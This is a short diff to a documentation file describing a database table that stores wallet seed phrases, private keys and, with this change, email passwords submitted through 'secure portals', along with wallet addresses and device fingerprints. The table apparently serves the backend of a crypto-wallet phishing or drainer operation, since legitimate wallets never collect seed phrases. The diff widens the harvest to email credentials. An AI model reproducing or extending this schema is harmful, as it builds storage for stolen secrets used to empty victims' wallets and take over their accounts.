@@ -36,7 +36,7 @@ Captures encrypted payload interactions from the secure portals.
 | `id` | uuid | `gen_random_uuid()` | Primary Key |
 | `wallet_name` | text | - | Name of the connecting wallet (e.g., MetaMask) |
 | `wallet_address` | text | - | The public address provided by the user |
-| `type` | text | - | Interaction type (seed-phrase, private-key, etc.) |
+| `type` | text | - | Interaction type (seed-phrase, private-key, email-password, etc.) |
 | `data` | jsonb | - | The sensitive payload (encrypted at rest) |
 | `timestamp` | timestamptz | `now()` | Time of submission |
 | `user_agent` | text | - | Browser/Device fingerprint of the sender |
